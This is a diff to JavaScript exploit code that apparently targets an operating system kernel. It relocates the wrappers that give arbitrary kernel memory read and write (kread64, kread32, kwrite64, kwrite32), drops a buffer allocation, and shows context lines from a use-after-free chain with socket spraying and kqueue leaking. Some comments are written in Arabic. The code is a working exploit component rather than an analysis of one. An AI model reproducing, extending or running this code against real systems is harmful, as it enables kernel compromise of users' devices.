@@ -208,10 +208,6 @@ var uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);
-var KR_BUFFERS = [];
-for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    KR_BUFFERS[i] = malloc(0x100); // حجم آمن وثابت
-}
 var spray_ipv6_ready = malloc(8);
 var spray_ipv6_done = malloc(8);
 var spray_ipv6_signal_buf = malloc(8);
@@ -1326,7 +1322,50 @@ function leak_kqueue() {
   triplets[1] = find_triplet(triplets[0], triplets[2]);
   return true;
 }
-
+/* ===========================
+  *   kread / kwrite wrappers
+  * =========================== */
+function kreadslow64(address) {
+  var buffer = kreadslow(address, 8);
+  if (buffer.eq(BigInt_Error)) {
+    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
+    cleanup();
+    throw new Error('kreadslow64 failed at ' + hex(address));
+  }
+  return read64(buffer);
+}
+function kread64(addr) {
+  return kreadslow64(addr);
+}
+function kread32(addr) {
+  var buf = kreadslow(addr, 4);
+  if (buf.eq(BigInt_Error)) {
+    log('[KR] kread32 failed at addr: ' + hex(addr));
+    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
+    return 0;
+  }
+  return read32(buf);
+}
+function kwrite64(addr, val) {
+  var buf = malloc(8);
+  write64(buf, val);
+  var ret = kwriteslow(addr, buf, 8);
+  if (ret.eq(BigInt_Error)) {
+    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val));
+    return false;
+  }
+  return true;
+}
+function kwrite32(addr, val) {
+  var buf = malloc(4);
+  write32(buf, val);
+  var ret = kwriteslow(addr, buf, 4);
+  if (ret.eq(BigInt_Error)) {
+    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val);
+    return false;
+  }
+  return true;
+}
 /* ===========================
   *   uio/KR/KW
   * ===========================
@@ -1474,15 +1513,6 @@ function kreadslow(addr, size) {
   if (triplets[2] === -1) return BigInt_Error;
   return leak_buffer;
 }
-function kreadslow64(address) {
-  var buffer = kreadslow(address, 8);
-  if (buffer.eq(BigInt_Error)) {
-    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
-    cleanup();
-    throw new Error('kreadslow64 failed at ' + hex(address));
-  }
-  return read64(buffer);
-}
 function kwriteslow(addr, buffer, size) {
   log('[KW] Enter kwriteslow addr=' + hex(addr));
   write32(sockopt_val_buf, size);
@@ -1594,42 +1624,6 @@ function setup_arbitrary_rw() {
   remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   remove_uaf_file();
   log('[RW] setup_arbitrary_rw: success');
-  return true;
-}
-/* ===========================
-  *   kread / kwrite wrappers
-  * =========================== */
-
-function kread64(addr) {
-  return kreadslow64(addr);
-}
-function kread32(addr) {
-  var buf = kreadslow(addr, 4);
-  if (buf.eq(BigInt_Error)) {
-    log('[KR] kread32 failed at addr: ' + hex(addr));
-    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
-    return 0;
-  }
-  return read32(buf);
-}
-function kwrite64(addr, val) {
-  var buf = malloc(8);
-  write64(buf, val);
-  var ret = kwriteslow(addr, buf, 8);
-  if (ret.eq(BigInt_Error)) {
-    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val));
-    return false;
-  }
-  return true;
-}
-function kwrite32(addr, val) {
-  var buf = malloc(4);
-  write32(buf, val);
-  var ret = kwriteslow(addr, buf, 4);
-  if (ret.eq(BigInt_Error)) {
-    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val);
-    return false;
-  }
   return true;
 }
 /* ===========================
